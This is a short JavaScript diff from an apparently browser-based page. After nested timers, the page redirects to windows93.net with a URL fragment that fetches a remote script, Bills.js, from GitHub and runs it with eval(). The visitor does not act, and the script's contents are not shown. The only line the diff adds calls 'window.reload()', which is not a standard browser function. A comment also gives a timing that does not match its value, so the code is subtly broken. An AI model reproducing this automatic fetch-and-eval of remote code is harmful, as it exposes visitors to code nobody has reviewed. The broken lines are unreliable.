@@ -161,6 +161,7 @@ setTimeout(function() {
     index = (index + 1) % sequence.length;
   }, 50); // Change every 0.5 seconds — adjust as you like
     setTimeout(function() {
+        window.reload()
         window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/Bills.js').then(response => response.text()).then(script => eval(script));";
     },6000)
 },60000)
